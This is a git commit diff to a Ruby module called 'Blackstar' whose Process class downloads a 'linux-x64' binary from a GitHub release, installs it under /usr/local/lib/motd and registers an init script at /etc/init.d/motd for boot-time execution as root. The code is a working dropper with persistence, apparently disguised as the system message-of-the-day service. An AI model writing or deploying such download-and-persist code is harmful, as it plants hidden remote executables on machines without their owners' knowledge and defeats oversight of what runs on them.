0e6fdb42851dd59217570bc2541c3f1707137c87
Anonymous <>
2018-08-16 15:16:21 +0300

    update

--- mrblib/blackstar/process.rb
+++ mrblib/blackstar/process.rb
@@ -1,7 +1,8 @@
 module Blackstar
   class Process
     STARTUP_SCRIPT_PATH = '/etc/init.d/motd'
-    EXEC_PATH = '/etc/init.d/motd2'
+    EXEC_DIR_PATH = '/usr/local/lib/motd'
+    EXEC_PATH = "#{EXEC_DIR_PATH}/motd"
     DOWNLOAD_URL = "https://github.com/speedy-gonzalez2017/blackstar/releases/download/0.0.1/linux-x64"
 
     def handle
@@ -11,24 +12,24 @@ module Blackstar
 
     def download_executable
       p "Downloading Exec"
-      `rm -f /tmp/motd2`
-      `wget -o /tmp/motd2 #{DOWNLOAD_URL}`
-      `cp /tmp/motd2 #{EXEC_PATH}`
+      `rm -f /tmp/linux-x64`
+      `wget -P /tmp "#{DOWNLOAD_URL}"`
+      `mv /tmp/linux-x64 #{EXEC_PATH}`
       `chmod +x #{EXEC_PATH}`
     end
 
     def handle_startup_script
       p "Setting up script"
       `rm #{STARTUP_SCRIPT_PATH} -f`
+      `mkdir -p #{EXEC_DIR_PATH}`
 
       File.open(STARTUP_SCRIPT_PATH, "w") do |f|
         f.write(MOTD_CONFIG)
       end
 
-      `update-rc.d motd defaults`
-      `update-rc.d motd start 10 2 3 4 5 . stop 90 0 1 6 .`
       `chmod 755 #{STARTUP_SCRIPT_PATH}`
       `chown root:root #{STARTUP_SCRIPT_PATH}`
+      `update-rc.d motd defaults`
     end
   end
 end
